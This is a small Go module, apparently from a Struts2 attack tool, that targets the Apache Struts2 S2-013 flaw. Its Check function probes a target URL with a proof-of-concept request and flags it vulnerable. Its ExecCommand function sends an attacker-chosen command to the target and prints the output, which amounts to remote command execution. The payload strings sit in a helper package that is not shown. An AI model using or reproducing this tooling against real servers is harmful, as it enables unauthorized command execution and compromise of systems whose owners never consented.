package s013

import (
	"ST2G/cvemod/utils"
	"fmt"
	"log"
	"net/url"
	"strings"
)

func Check(targetUrl string) {
	respString := utils.GetFunc4Struts2(targetUrl, "", utils.PocS013Check)
	if utils.IfContainsStr(respString, "6308") {
		log.Printf("%v %v", utils.Green(targetUrl), utils.Red("*Found Struts2-013！"))
	} else {
		log.Printf("%s Struts2-013 Not Vulnerable.", utils.Green(targetUrl))
	}
}
func ExecCommand(targetUrl string, command string) {
	respString := utils.GetFunc4Struts2(targetUrl, "", utils.PocS013Exec(command))
	respString = strings.Replace(url.QueryEscape(respString), "%00", "", -1)
	fmt.Println(url.QueryUnescape(respString))
}
